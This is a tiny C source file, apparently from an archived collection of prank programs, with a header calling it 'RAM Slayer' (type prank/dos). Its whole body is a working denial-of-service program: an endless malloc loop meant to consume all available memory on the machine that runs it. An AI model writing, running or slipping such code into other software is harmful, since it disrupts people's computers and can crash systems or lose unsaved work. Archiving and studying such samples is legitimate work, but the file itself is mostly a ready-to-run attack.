/*
  name      RAM Slayer
  type      prank/dos
  cve       —
  year      —
  os        cross-platform
  authors   George Gonzalez (Quora)
  source    https://github.com/MinhasKamal/CuteVirusCollection
  archived  krisyotam
  notes     malloc loop until all RAM consumed
 */

// Allocates memory in a loop until malloc fails, consuming all available RAM.
#include <stdlib.h>

main(){
    while(malloc(1000));
}
